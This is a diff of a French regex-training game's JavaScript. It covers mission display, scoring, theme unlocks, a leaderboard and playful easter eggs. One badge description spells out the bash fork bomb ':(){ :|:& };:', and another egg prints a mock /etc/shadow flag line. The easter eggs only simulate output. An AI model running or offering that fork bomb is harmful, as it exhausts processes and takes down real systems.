+  printHtml(`  <span class="badge-gold"> 🏅 HAUT FAIT </span> <span class="c-cyan bold">[${esc(badgeName)}]</span> : <span class="c-fg">${esc(desc)}</span>`);
+}
+
+function checkProgressionUnlocks() {
+  const mCount = profile.masteredIds.length;
+  if (mCount >= 9)  unlockTheme("mr-robot", "Palier N2 atteint : 9+ missions maîtrisées");
+  if (mCount >= 18) unlockTheme("lain", "Palier N3 atteint : 18+ missions maîtrisées");
+  if (mCount >= 27) unlockTheme("ghost-root", "Palier N4 atteint : 27+ missions maîtrisées");
+  if (mCount >= 48) unlockBadge("MAÎTRE PCRE", "Les 48 missions RegEx ont été maîtrisées sans afficher la solution !");
+}
+
+function populateThemeSelect() {
+  const sel = document.getElementById('theme-select');
+  const groups = {};
+  for (const [k, v] of Object.entries(THEMES)) {
+    if (!groups[v.group]) groups[v.group] = [];
+    groups[v.group].push({ key: k, ...v });
+  }
+  sel.innerHTML = "";
+  for (const [gName, items] of Object.entries(groups)) {
+    const optg = document.createElement('optgroup');
+    optg.label = gName;
+    for (const it of items) {
+      const opt = document.createElement('option');
+      opt.value = it.key;
+      const unlocked = isThemeUnlocked(it.key);
+      opt.disabled = !unlocked;
+      opt.textContent = unlocked ? it.label : `🔒 ${it.label} — [${it.unlockHint}]`;
+      optg.appendChild(opt);
+    }
+    sel.appendChild(optg);
+  }
+  if (THEMES[profile.theme]) sel.value = profile.theme;
+}
+
+function setTheme(themeKey, silent = false) {
+  if (!THEMES[themeKey]) return false;
+  if (!isThemeUnlocked(themeKey)) {
+    if (!silent) {
+      printHtml(`  <span class="c-yellow">[🔒 Thème verrouillé]</span> Condition requise : <span class="c-cyan bold">${esc(THEMES[themeKey].unlockHint)}</span>`);
+    }
+    document.getElementById('theme-select').value = profile.theme;
+    return false;
+  }
+  profile.theme = themeKey;
+  const t = THEMES[themeKey];
+  const r = document.documentElement.style;
+  r.setProperty('--c-bg', t.bg);
+  r.setProperty('--c-bar-bg', t.bar);
+  r.setProperty('--c-bar-fg', t.barFg || t.fg);
+  r.setProperty('--c-bar-dim', t.barDim || t.dim);
+  r.setProperty('--c-fg', t.fg);
+  r.setProperty('--c-dim', t.dim);
+  r.setProperty('--c-border', t.border);
+  r.setProperty('--c-cyan', t.cyan);
+  r.setProperty('--c-green', t.green);
+  r.setProperty('--c-red', t.red);
+  r.setProperty('--c-yellow', t.yellow);
+  r.setProperty('--c-magenta', t.magenta);
+  r.setProperty('--c-blue', t.blue);
+  document.getElementById('theme-select').value = themeKey;
+  saveProfile();
+  if (!silent) printHtml(`<span class="c-green">[✓]</span> Thème appliqué : <span class="c-cyan bold">${esc(t.label)}</span>`);
+  return true;
+}
+
+function setFontFamily(fontVal, silent = false) {
+  profile.fontFamily = fontVal;
+  document.documentElement.style.setProperty('--term-font', fontVal);
+  document.getElementById('font-select').value = fontVal;
+  saveProfile();
+  if (!silent) printHtml(`<span class="c-green">[✓]</span> Police modifiée : <span class="c-cyan bold">${esc(fontVal.split(',')[0])}</span>`);
+}
+
+function setFontSize(sizeVal, silent = false) {
+  const normalized = String(sizeVal).endsWith('px') ? sizeVal : `${sizeVal}px`;
+  profile.fontSize = normalized;
+  document.documentElement.style.setProperty('--term-size', normalized);
+  document.getElementById('size-select').value = normalized;
+  saveProfile();
+  if (!silent) printHtml(`<span class="c-green">[✓]</span> Taille de police : <span class="c-cyan bold">${esc(normalized)}</span>`);
+}
+
+function updatePromptLabel() {
+  const u = esc(profile.pseudo || "soc");
+  const rk = getOperatorRank();
+  const streakStr = profile.streak >= 3 ? `<span class="c-yellow bold">[🔥${profile.streak}]</span>` : "";
+  if (state.wizardStep > 0) {
+    promptLbl.innerHTML = `${streakStr}<span class="c-cyan bold">${u}@${rk.title}</span>:<span class="c-blue bold">~/custom</span>${rk.sym}`;
+  } else if (state.active) {
+    const mid = state.playlist[state.stepIdx];
+    promptLbl.innerHTML = `${streakStr}<span class="c-cyan bold">${u}@${rk.title}</span>:<span class="c-blue bold">regex-${String(mid).padStart(2, '0')}</span>${rk.sym}`;
+  } else {
+    promptLbl.innerHTML = `${streakStr}<span class="c-cyan bold">${u}@${rk.title}</span>:<span class="c-blue bold">~</span>${rk.sym}`;
+  }
+}
+
+function loadProfile() {
+  try {
+    const saved = localStorage.getItem(STORAGE_KEY);
+    if (saved) profile = { ...profile, ...JSON.parse(saved) };
+  } catch (e) {}
+  populateThemeSelect();
+  if (!setTheme(profile.theme, true)) setTheme("bash-classic", true);
+  setFontFamily(profile.fontFamily, true);
+  setFontSize(profile.fontSize, true);
+  updatePromptLabel();
+}
+
+function saveProfile() {
+  try { localStorage.setItem(STORAGE_KEY, JSON.stringify(profile)); } catch (e) {}
+  updatePromptLabel();
+}
+
+function focusPrompt() {
+  if (!state.busy && window.getSelection().toString() === "") inpEl.focus();
+}
+
+function execFromNav(cmd) {
+  if (state.busy) return;
+  inpEl.value = cmd;
+  handleInput(cmd);
+  inpEl.value = "";
+  inpEl.focus();
+}
+
+// =============================================================================
+// 4. PARSEUR REGEX & RAYONS-X (SURLIGNAGE DES SOUS-CHAÎNES MATCHÉES)
+// =============================================================================
+function compileUserRegex(rawPattern) {
+  // Supporte soit une RegEx brute ^abc$, soit la notation /motif/flags (ex: /^abc$/i)
+  let source = rawPattern;
+  let flags = "";
+  if (rawPattern.startsWith("/") && rawPattern.lastIndexOf("/") > 0) {
+    const lastSlash = rawPattern.lastIndexOf("/");
+    const candidateFlags = rawPattern.slice(lastSlash + 1);
+    if (/^[gimsuy]*$/.test(candidateFlags)) {
+      source = rawPattern.slice(1, lastSlash);
+      // Retirer 'g' et 'y' pour éviter tout effet de bord stateful avec .test()/.exec()
+      flags = candidateFlags.replace(/[gy]/g, "");
+    }
+  }
+  return new RegExp(source, flags);
+}
+
+function highlightMatchInLine(regex, line, colorCls) {
+  const m = regex.exec(line);
+  if (!m) return esc(line);
+  const idx = m.index;
+  const matchedText = m[0];
+  if (matchedText.length === 0) {
+    // Assertion de largeur nulle (ex: ^ ou $)
+    return `${esc(line.slice(0, idx))}<span class="${colorCls} bold">[⚡]</span>${esc(line.slice(idx))}`;
+  }
+  const before = esc(line.slice(0, idx));
+  const mid = esc(matchedText);
+  const after = esc(line.slice(idx + matchedText.length));
+  return `${before}<span class="match-hl ${colorCls}">[${mid}]</span>${after}`;
+}
+
+// =============================================================================
+// 5. BANNIÈRE ASCII & AFFICHAGE DES MISSIONS
+// =============================================================================
+function drawAsciiHeader() {
+  const banner = [
+    "    ____  ______ ______ ______ _   __       ____   ____   _____",
+    "   / __ \\/ ____// ____// ____/| | / /      / __ \\ / __ \\ / ___/",
+    "  / /_/ / __/  / / __ / __/   | |/ /______/ / / // /_/ / \\__ \\ ",
+    " / _, _/ /___ / /_/ // /___   /   |/_____/ /_/ // ____/ ___/ / ",
+    "/_/ |_/_____/ \\____//_____/  /_/|_|      \\____//_/     /____/  "
+  ].join("\n");
+
+  const rk = getOperatorRank();
+  printHtml(`<span class="c-cyan bold">${esc(banner)}</span>`);
+  printHtml(`  <span class="c-dim">Simulateur SIEM, Grep &amp; PCRE — Maîtrise des Expressions Régulières (48 Missions)</span>`);
+  printHtml(`<span class="c-blue">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>`);
+  printHtml(`  <span class="bold">Maîtrise :</span> <span class="c-green bold">${String(profile.masteredIds.length).padStart(2, '0')}/${TOTAL_MISSIONS}</span> │ <span class="bold">Grade :</span> <span class="c-magenta bold">${esc(rk.title)}</span> │ <span class="bold">Streak :</span> <span class="c-yellow bold">🔥${profile.streak}</span> │ <span class="bold">Score :</span> <span class="c-yellow bold">${state.sessionScore} pts</span>`);
+  printHtml(`<span class="c-blue">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>`);
+}
+
+function tierName(d) {
+  return {
+    1: "TIER 1 : TECHNICIEN N1 (Ancres ^ $, Échappement \\. & Quantifieurs)",
+    2: "TIER 2 : ADMIN SYSTÈME N2 (Classes \\d \\w \\s, Bornes \\b & {n,m})",
+    3: "TIER 3 : ANALYSTE SOC N3 (Groupes, Alternation | & Plages Réseau)",
+    4: "TIER 4 : EXPERT FORENSICS N4 (Références Arrières \\1 \\2 & Corrélation)",
+    5: "TIER 5 : ARCHITECTE SECOPS N5 (Lookarounds (?=...) (?!...) & SIEM)"
+  }[d] || "MODE MIXTE";
+}
+
+function printMission() {
+  const mid = state.playlist[state.stepIdx];
+  const m = MISSIONS.find(x => x.id === mid);
+  if (!m) {
+    state.active = false;
+    state.awaitingNext = false;
+    updatePromptLabel();
+    printText("");
+    printHtml(`<span class="c-green bold">╔══════════════════════════════════════════════════════════════════════════╗</span>`);
+    printHtml(`<span class="c-green bold">║  🏆 SESSION TERMINÉE ! Score : ${String(state.sessionScore).padEnd(5)} pts | Maîtrise : ${String(profile.masteredIds.length).padStart(2, '0')}/${TOTAL_MISSIONS} missions     ║</span>`);
+    printHtml(`<span class="c-green bold">╚══════════════════════════════════════════════════════════════════════════╝</span>`);
+    printHtml(`  Tape <span class="c-cyan bold">submit</span> pour publier ton score sur le Leaderboard, ou <span class="c-cyan bold">start</span>.`);
+    return;
+  }
+
+  state.attempts = 0;
+  state.usedHint = 0;
+  state.awaitingNext = false;
+  state.startTimeMs = Date.now();
+  updatePromptLabel();
+
+  const mastTag = profile.masteredIds.includes(m.id)
+    ? ` <span class="c-green bold">[✓ MAÎTRISÉE]</span>` : "";
+
+  printText("");
+  printHtml(`  <span class="badge-tier"> ${esc(tierName(m.diff))} </span>  <span class="badge-theme"> ${esc(m.theme)} </span>${mastTag}`);
+  printHtml(`  <span class="c-cyan bold">Mission #${String(m.id).padStart(2, '0')} — ${esc(m.title)}</span> <span class="c-dim">(${state.stepIdx + 1}/${state.playlist.length})</span>`);
+  printText("");
+  printHtml(`  <span class="c-fg">${esc(m.scenario)}</span>`);
+  printText("");
+
+  printHtml(`  <span class="bold">Flux d'événements &amp; échantillons à filtrer (grep -E / PCRE) :</span>`);
+  printHtml(`  <span class="c-dim">┌──────────────────────────────────────┬──────────────────────────────────────┐</span>`);
+  printHtml(`  <span class="c-dim">│</span> <span class="c-green bold">[✓] ÉVÉNEMENTS À CAPTURER (Targets)</span>  <span class="c-dim">│</span> <span class="c-red bold">[✗] BRUIT &amp; PIÈGES À EXCLURE (Decoys)</span><span class="c-dim">│</span>`);
+  printHtml(`  <span class="c-dim">├──────────────────────────────────────┼──────────────────────────────────────┤</span>`);
+
+  const maxRows = Math.max(m.targets.length, m.decoys.length);
+  for (let i = 0; i < maxRows; i++) {
+    const tStr = (m.targets[i] || "").padEnd(36);
+    const dStr = (m.decoys[i] || "").padEnd(36);
+    printHtml(`  <span class="c-dim">│</span> <span class="c-green">${esc(tStr)}</span> <span class="c-dim">│</span> <span class="c-red">${esc(dStr)}</span> <span class="c-dim">│</span>`);
+  }
+  printHtml(`  <span class="c-dim">└──────────────────────────────────────┴──────────────────────────────────────┘</span>`);
+  printHtml(`  <span class="c-dim">Commandes : ta RegEx, xray &lt;regex&gt;, hint, sol, memo, skip, goto &lt;1-${TOTAL_MISSIONS}&gt;, exit</span>`);
+  printText("");
+}
+
+function runXrayInspector(rawPattern) {
+  if (!state.active) {
+    printHtml(`  <span class="c-yellow">[!] Lance d'abord une mission ('start') pour utiliser le scanner Rayons-X.</span>`);
+    return;
+  }
+  const mid = state.playlist[state.stepIdx];
+  const m = MISSIONS.find(x => x.id === mid);
+  let rx;
+  try {
+    rx = compileUserRegex(rawPattern);
+  } catch (err) {
+    printHtml(`  <span class="c-red">[✗] Erreur RegEx : ${esc(err.message)}</span>`);
+    return;
+  }
+
+  printText("");
+  printHtml(`  <span class="c-magenta bold">🔬 SCANNER RAYONS-X (Groupes &amp; Sous-chaînes) pour :</span> <span class="c-cyan bold">${esc(rawPattern)}</span>`);
+  for (const t of m.targets) {
+    const res = rx.exec(t);
+    const groups = res && res.length > 1 ? ` <span class="c-yellow">➔ Groupes: ${res.slice(1).map((g, i) => `\\${i + 1}="${esc(g ?? '')}"`).join(', ')}</span>` : "";
+    printHtml(`    <span class="c-green">[Cible]</span> ${highlightMatchInLine(rx, t, "c-green")}${groups}`);
+  }
+  for (const d of m.decoys) {
+    const res = rx.exec(d);
+    const groups = res && res.length > 1 ? ` <span class="c-yellow">➔ Groupes: ${res.slice(1).map((g, i) => `\\${i + 1}="${esc(g ?? '')}"`).join(', ')}</span>` : "";
+    printHtml(`    <span class="c-red">[Piège]</span> ${highlightMatchInLine(rx, d, "c-red")}${groups}`);
+  }
+  printText("");
+}
+
+function evaluateRegexAttempt(rawPattern) {
+  const mid = state.playlist[state.stepIdx];
+  const m = MISSIONS.find(x => x.id === mid);
+
+  let rx;
+  try {
+    rx = compileUserRegex(rawPattern);
+  } catch (err) {
+    printHtml(`  <span class="c-red">[✗] Erreur de syntaxe RegEx : ${esc(err.message)}</span>`);
+    return;
+  }
+
+  // Anti-triche : interdire de coller les 4 cibles littérales complètes séparées par '|'
+  const literalTargetsJoined = m.targets.filter(t => rawPattern.includes(t));
+  if (literalTargetsJoined.length >= 3 && rawPattern.includes("|")) {
+    printHtml(`  <span class="c-yellow">[!] Anti-triche SIEM : Interdiction de copier-coller la liste littérale des cibles avec '|'. Trouve la structure commune !</span>`);
+    return;
+  }
+
+  state.attempts++;
+  let tp = [], fp = [], fn = [];
+  for (const t of m.targets) {
+    if (rx.test(t)) tp.push(t);
+    else fn.push(t);
+  }
+  for (const d of m.decoys) {
+    if (rx.test(d)) fp.push(d);
+  }
+
+  if (tp.length === 0 && fp.length === 0) {
+    profile.streak = 0;
+    saveProfile();
+    printHtml(`  <span class="c-red">[✗] Aucune ligne ne correspond à l'expression :</span> <span class="bold">${esc(rawPattern)}</span>`);
+    return;
+  }
+
+  // Victoire !
+  if (fp.length === 0 && fn.length === 0) {
+    const elapsed = Math.max(1, Math.floor((Date.now() - state.startTimeMs) / 1000));
+    let pts = 100 - (state.attempts - 1) * 15 - (state.usedHint === 1 ? 30 : 0);
+    if (pts < 20) pts = 20;
+
+    let speed = elapsed <= 12 ? 30 : (elapsed <= 25 ? 15 : (elapsed <= 50 ? 5 : 0));
+    let bonusTags = [];
+
+    if (state.usedHint === 2) {
+      pts = 10;
+      speed = 0;
+      profile.streak = 0;
+    } else {
+      if (!profile.masteredIds.includes(m.id)) profile.masteredIds.push(m.id);
+
+      // Gestion du Streak (1er coup sans indice)
+      if (state.attempts === 1 && state.usedHint === 0) {
+        profile.streak++;
+        if (profile.streak > profile.bestStreak) profile.bestStreak = profile.streak;
+
+        // Bonus Overclock (< 6s du 1er coup)
+        if (elapsed <= 6) {
+          speed += 50;
+          bonusTags.push("⚡ OVERCLOCK +50");
+          unlockTheme("pipboy", "Mission résolue en moins de 6 secondes du 1er coup !");
+          unlockBadge("OVERCLOCKER", "Résoudre une expression régulière en moins de 6 secondes.");
+        }
+
+        // Bonus de Série (Streak)
+        if (profile.streak === 3) {
+          pts += 25;
+          bonusTags.push("🔥 STREAK x3 (+25)");
+        } else if (profile.streak === 5) {
+          pts += 60;
+          bonusTags.push("🔥 STREAK x5 (+60)");
+          unlockTheme("wargames", "Série de 5 missions résolues du 1er coup sans erreur !");
+          unlockBadge("FIVE EYES", "5 missions consécutives résolues du premier coup.");
+        } else if (profile.streak >= 10 && profile.streak % 5 === 0) {
+          pts += 120;
+          bonusTags.push(`👑 STREAK x${profile.streak} (+120)`);
+          unlockBadge("UNSTOPPABLE SIEM", "10 missions consécutives résolues du premier coup.");
+        }
+      } else {
+        profile.streak = 0;
+      }
+
+      // Bonus RegEx Golf (expression plus courte que la solution canonique !)
+      if (rawPattern.length < m.solution.length) {
+        pts += 35;
+        bonusTags.push(`⛳ REGEX GOLF (${rawPattern.length} vs ${m.solution.length} chars : +35)`);
+        unlockBadge("REGEX GOLFER", "Battre la longueur de la solution canonique sur une mission.");
+      }
+    }
+
+    const totalPts = pts + speed;
+    state.sessionScore += totalPts;
+    profile.totalScore += totalPts;
+    if (state.sessionScore > profile.bestScore) profile.bestScore = state.sessionScore;
+    if (state.mode === "CAMPAIGN" && m.id >= profile.campaignUnlocked && profile.campaignUnlocked < TOTAL_MISSIONS) {
+      profile.campaignUnlocked = m.id + 1;
+    }
+
+    state.awaitingNext = true;
+    printText("");
+    printHtml(`  <span class="c-green bold">╔══════════════════════════════════════════════════════════════════════════╗</span>`);
+    printHtml(`  <span class="c-green bold">║  [✓] MISSION #${String(m.id).padStart(2, '0')} ACCOMPLIE ! (+${totalPts} pts | ⏱ ${elapsed}s | Streak: 🔥${profile.streak})</span>`);
+    printHtml(`  <span class="c-green bold">╚══════════════════════════════════════════════════════════════════════════╝</span>`);
+    if (bonusTags.length > 0) {
+      printHtml(`  <span class="badge-gold"> BONUS PERFORMANCE </span> <span class="c-yellow bold">${esc(bonusTags.join("  •  "))}</span>`);
+    }
+    printHtml(`  <span class="bold">Ta RegEx          :</span> <span class="c-green bold">${esc(rawPattern)}</span>`);
+    printHtml(`  <span class="bold">Solution optimale :</span> <span class="c-cyan bold">${esc(m.solution)}</span>`);
+    printText("");
+    printHtml(`  <span class="c-yellow bold">Débriefing Technique :</span>`);
+    printHtml(`  <span class="c-fg">${esc(m.debrief)}</span>`);
+
+    checkProgressionUnlocks();
+    saveProfile();
+
+    printText("");
+    printHtml(`  <span class="c-dim">👉 Appuie sur [ENTRÉE] pour passer à la mission suivante...</span>`);
+    return;
+  }
+
+  // Échec -> Reset du streak et affichage du rapport Rayons-X
+  profile.streak = 0;
+  saveProfile();
+
+  printText("");
+  printHtml(`  <span class="bold">Diagnostic SIEM pour <span class="c-cyan">${esc(rawPattern)}</span> :</span>`);
+  if (tp.length > 0) {
+    printHtml(`    <span class="c-green bold">[✓] Cibles capturées (${tp.length}/${m.targets.length}) :</span> ${tp.map(x => highlightMatchInLine(rx, x, "c-green")).join('   ')}`);
+  }
+  if (fp.length > 0) {
+    printHtml(`    <span class="c-red bold">[✗] FAUX POSITIFS (${fp.length} piège(s) déclenché(s) — zone matchée entre [ ]) :</span>`);
+    fp.forEach(d => {
+      printHtml(`        <span class="c-red">•</span> ${highlightMatchInLine(rx, d, "c-red")}`);
+    });
+  }
+  if (fn.length > 0) {
+    printHtml(`    <span class="c-yellow bold">[!] Cibles manquées (${fn.length}) :</span> ${esc(fn.join('   '))}`);
+  }
+}
+
+// =============================================================================
+// 6. EASTER EGGS ASYNCHRONES (REAPER, FORK BOMB, WOPR & SECRET FLAG)
+// =============================================================================
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+async function runReaperEasterEgg() {
+  state.busy = true;
+  promptForm.style.display = "none";
+
+  const steps = [
+    { delay: 400,  html: `<span class="c-red bold">CRITICAL ERROR: UNAUTHORIZED ROOT DELETION ATTEMPT DETECTED.</span>` },
+    { delay: 800,  html: `<span class="c-yellow">&gt;&gt; Escalating threat level...</span>` },
+    { delay: 1000, html: `<span class="c-yellow">&gt;&gt; Escalate to sysadmin: <span class="c-red bold">FAILED</span> (sysadmin unresponsive).</span>` },
+    { delay: 900,  html: `<span class="c-red bold">&gt;&gt; Engaging DEFCON 2 Automated Retaliation Protocol.</span>` },
+    { delay: 1100, html: `<span class="c-cyan">[SYSTEM] Uplinking to secure military subnet (USCYBERCOM)...</span>` },
+    { delay: 1000, html: `<span class="c-green bold">[SECURE-LINK] CONNECTION ESTABLISHED.</span>` },
+    { delay: 800,  html: `<span class="c-magenta">root@pentagon.gov:~#</span> request_kinetic_strike --target=origin_ip` },
+    { delay: 1100, html: `<span class="c-dim">[AUTH] Awaiting POTUS biometric signature...</span>` },
+    { delay: 1200, html: `<span class="c-green">[AUTH] Biometric signature VERIFIED.</span>` },
+    { delay: 900,  html: `<span class="c-green bold">[AUTH] Authorization code: DELTA-TANGO-77 ACCEPTED.</span>` },
+    { delay: 950,  html: `<span class="c-yellow bold">&gt;&gt; UCAV MQ-9 Reaper drone deployment: CONFIRMED.</span>` },
+    { delay: 850,  html: `<span class="c-red bold">&gt;&gt; Target locked on origin IP: 44.152.241.194</span>` }
+  ];
+
+  for (const s of steps) {
+    await sleep(s.delay);
+    printHtml(s.html);
+  }
+
+  await sleep(650);
+  const etaLine = printHtml(`<span class="c-red bold">&gt;&gt; ETA to target impact: 00:04:30.</span>`);
+  for (let sec = 269; sec >= 265; sec--) {
+    await sleep(600);
+    const m = String(Math.floor(sec / 60)).padStart(2, '0');
+    const s = String(sec % 60).padStart(2, '0');
+    etaLine.innerHTML = `<span class="c-red bold">&gt;&gt; ETA to target impact: 00:${m}:${s}.</span>`;
+  }
+
+  await sleep(500);
+  printHtml(`<span class="c-yellow bold">Please remain seated and do not leave the building.</span>`);
+  unlockBadge("KINETIC TARGET", "Déclencher le protocole de représailles USCYBERCOM.");
+  printText("");
+
+  state.busy = false;
+  promptForm.style.display = "flex";
+  focusPrompt();
+}
+
+async function runForkBombEasterEgg() {
+  state.busy = true;
+  promptForm.style.display = "none";
+
+  const pids = [1842, 3684, 7368, 14736, 29472, 32767];
+  for (const p of pids) {
+    await sleep(320);
+    printHtml(`<span class="c-yellow">[kernel] fork(): spawning child process tree... active tasks: ${p}/32768</span>`);
+  }
+  await sleep(500);
+  printHtml(`<span class="c-red bold">-bash: fork: retry: Resource temporarily unavailable</span>`);
+  await sleep(600);
+  printHtml(`<span class="c-red bold">[  842.190421] cgroup: fork rejected by pids controller in /user.slice/user-1000.slice</span>`);
+  await sleep(700);
+  printHtml(`<span class="c-cyan">[systemd-oomd] Killing offending process group ':' (PIDs 1842..32767).</span>`);
+  await sleep(500);
+  printHtml(`<span class="c-green bold">[SYSTÈME] Cgroup pids.max a sauvé le noyau ! Toujours configurer /etc/security/limits.conf ;)</span>`);
+  unlockBadge("FORK BOMBER", "Tester la résilience cgroup v2 avec :(){ :|:& };:");
+  printText("");
+
+  state.busy = false;
+  promptForm.style.display = "flex";
+  focusPrompt();
+}
+
+async function runWoprEasterEgg() {
+  state.busy = true;
+  promptForm.style.display = "none";
+
+  await sleep(400);
+  printHtml(`<span class="c-cyan">LOGON: JOSHUA</span>`);
+  await sleep(700);
+  printHtml(`<span class="c-green bold">GREETINGS PROFESSOR FALKEN.</span>`);
+  await sleep(900);
+  printHtml(`<span class="c-green bold">SHALL WE PLAY A GAME?</span>`);
+  await sleep(900);
+  printHtml(`<span class="c-dim">A STRANGE GAME. THE ONLY WINNING MOVE IS TO ANCHOR YOUR REGEX WITH ^ AND $.</span>`);
+  unlockTheme("wargames", "Connexion secrète au mainframe WOPR avec le mot de passe JOSHUA !");
+  printText("");
+
+  state.busy = false;
+  promptForm.style.display = "flex";
+  focusPrompt();
+}
+
+function triggerSecretFlag() {
+  printText("");
+  printHtml(`  <span class="c-magenta bold">/etc/shadow.bak:42:FLAG{R3G3X_G0D_TSSR_2026}:19800:0:99999:7:::</span>`);
+  if (!profile.foundFlag) {
+    profile.foundFlag = true;
+    profile.totalScore += 200;
+    state.sessionScore += 200;
+    if (state.sessionScore > profile.bestScore) profile.bestScore = state.sessionScore;
+    unlockBadge("WHITEHAT HUNTER", "Découvrir le Flag caché dans le système de fichiers (+200 pts).");
+    saveProfile();
+    printHtml(`  <span class="c-green bold">[🎉 SECRET TROUVÉ] +200 pts ajoutés à ton score pour ta curiosité d'auditeur !</span>`);
+  } else {
+    printHtml(`  <span class="c-dim">(Tu as déjà récupéré les +200 pts de ce Flag.)</span>`);
+  }
+  printText("");
+}
+
+// =============================================================================
+// 7. MANUEL TECHNIQUE REGEX & LEADERBOARD
+// =============================================================================
+function showMemo() {
+  printText("");
+  printHtml(`  <span class="c-magenta bold">╔══════════════════════ MANUEL TECHNIQUE : REGEX (ERE / PCRE) ══════════════════════╗</span>`);
+  printHtml(`  <span class="c-cyan bold">1. Ancres &amp; Frontières (Ne consomment aucun caractère) :</span>`);
+  printHtml(`    <span class="c-cyan bold">^</span>              Début de la ligne       <span class="c-cyan bold">$</span>              Fin de la ligne`);
+  printHtml(`    <span class="c-cyan bold">\\b</span>             Frontière de mot        <span class="c-cyan bold">\\B</span>             Non-frontière de mot`);
+  printText("");
+  printHtml(`  <span class="c-cyan bold">2. Métacaractères &amp; Classes Abrégées PCRE :</span>`);
+  printHtml(`    <span class="c-cyan bold">.</span>              N'importe quel caractère <span class="c-yellow">(Attention : utilise \\. pour un vrai point !)</span>`);
+  printHtml(`    <span class="c-cyan bold">\\d</span> / <span class="c-cyan bold">\\D</span>        Chiffre [0-9] / Non-chiffre [^0-9]`);
+  printHtml(`    <span class="c-cyan bold">\\w</span> / <span class="c-cyan bold">\\W</span>        Mot [a-zA-Z0-9_] / Non-mot [^a-zA-Z0-9_]`);
+  printHtml(`    <span class="c-cyan bold">\\s</span> / <span class="c-cyan bold">\\S</span>        Espace blanc (espace, tab) / Non-espace`);
+  printHtml(`    <span class="c-cyan bold">[abc]  [^abc]</span>  1 caractère dans la liste / 1 caractère QUI N'EST PAS dans la liste`);
+  printText("");
+  printHtml(`  <span class="c-cyan bold">3. Quantifieurs (S'appliquent uniquement à l'élément ou groupe précédent) :</span>`);
+  printHtml(`    <span class="c-yellow bold">?</span>              0 ou 1 fois (Optionnel) <span class="c-yellow bold">+</span>              1 ou N fois (Au moins 1)`);
+  printHtml(`    <span class="c-yellow bold">*</span>              0, 1 ou N fois          <span class="c-yellow bold">{n} / {n,m}</span>    Exactement n / de n à m fois`);
+  printHtml(`    <span class="c-yellow bold">+? / *?</span>        Version Lazy (Non-gourmande : s'arrête dès le 1er match possible)`);
+  printText("");
+  printHtml(`  <span class="c-cyan bold">4. Groupes, Alternation &amp; Références Arrières :</span>`);
+  printHtml(`    <span class="c-green bold">(a|b)</span>          Matche 'a' OU 'b' et capture le résultat dans le groupe numéroté`);
+  printHtml(`    <span class="c-green bold">(?:a|b)</span>        Groupe non-capturant (groupe sans décaler les numéros \\1, \\2)`);
+  printHtml(`    <span class="c-green bold">\\1, \\2</span>         Référence arrière : doit matcher exactement le texte capturé par le groupe 1 ou 2`);
+  printText("");
+  printHtml(`  <span class="c-cyan bold">5. Lookarounds (Assertions avant/arrière de largeur nulle) :</span>`);
+  printHtml(`    <span class="c-magenta bold">(?=motif)</span>      Positive Lookahead  : exige que 'motif' suive à droite`);
+  printHtml(`    <span class="c-magenta bold">(?!motif)</span>      Negative Lookahead  : interdit que 'motif' suive à droite`);
+  printHtml(`    <span class="c-magenta bold">(?&lt;=motif)</span>     Positive Lookbehind : exige que 'motif' précède à gauche`);
+  printHtml(`    <span class="c-magenta bold">(?&lt;!motif)</span>     Negative Lookbehind : interdit que 'motif' précède à gauche`);
+  printHtml(`  <span class="c-magenta bold">╚═══════════════════════════════════════════════════════════════════════════════════╝</span>`);
+  printText("");
+}
+
+async function showLeaderboard() {
+  printHtml(`<span class="c-dim">Récupération du Leaderboard SIEM/SOC...</span>`);
+  if (SUPABASE_URL && SUPABASE_KEY) {
+    try {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/leaderboard?select=pseudo,score,mastered&order=score.desc&limit=15`, {
+        headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` }
+      });
+      if (res.ok) {
+        renderBoardTable(await res.json(), "LEADERBOARD PUBLIC EN LIGNE");
+        return;
+      }
+    } catch (e) {}
+  }
+  const list = [...profile.localBoard];
+  const myBest = Math.max(profile.bestScore, profile.totalScore);
+  const ex = list.find(x => x.pseudo === profile.pseudo);
+  if (ex) { ex.score = Math.max(ex.score, myBest); ex.mastered = profile.masteredIds.length; }
+  else list.push({ pseudo: profile.pseudo, score: myBest, mastered: profile.masteredIds.length });
+  list.sort((a, b) => b.score - a.score);
+  renderBoardTable(list.slice(0, 10), "LEADERBOARD (Mode Local)");
+}
+
+function renderBoardTable(rows, title) {
+  printText("");
+  printHtml(`  <span class="c-cyan bold">=== ${esc(title)} ===</span>`);
+  printHtml(`  <span class="c-dim">RANG   PSEUDO                 SCORE        MAÎTRISE</span>`);
+  printHtml(`  <span class="c-dim">────   ────────────────────   ──────────   ────────</span>`);
+  rows.forEach((r, idx) => {
+    const rk = `#${String(idx + 1).padStart(2, '0')}`.padEnd(7);
+    const ps = String(r.pseudo).slice(0, 20).padEnd(23);
+    const sc = `${r.score} pts`.padEnd(13);
+    const ma = `${r.mastered}/${TOTAL_MISSIONS}`;
+    printHtml(`  <span class="c-yellow bold">${esc(rk)}</span><span class="c-fg">${esc(ps)}</span><span class="c-green bold">${esc(sc)}</span><span class="c-cyan">${esc(ma)}</span>`);
+  });
+  printHtml(`  <span class="c-dim">Commandes : 'nick &lt;pseudo&gt;' puis 'submit' pour publier ton score.</span>`);
+  printText("");
+}
+
+async function submitScoreToBoard() {
+  const best = Math.max(profile.bestScore, profile.totalScore);
+  if (best <= 0) {
+    printHtml(`<span class="c-yellow">[!] Résous au moins une mission avant de publier ton score.</span>`);
+    return;
+  }
+  if (SUPABASE_URL && SUPABASE_KEY) {
+    try {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/leaderboard`, {
+        method: "POST",
+        headers: {
+          "apikey": SUPABASE_KEY,
+          "Authorization": `Bearer ${SUPABASE_KEY}`,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ pseudo: profile.pseudo, score: best, mastered: profile.masteredIds.length })
+      });
+      if (res.ok) {
+        printHtml(`<span class="c-green bold">[✓] Score de ${best} pts publié sous '${esc(profile.pseudo)}' !</span>`);
+        showLeaderboard();
+        return;
+      }
+    } catch (e) {}
+  }
+  printHtml(`<span class="c-green bold">[✓] Score enregistré pour '${esc(profile.pseudo)}' (${best} pts).</span>`);
+  showLeaderboard();
+}
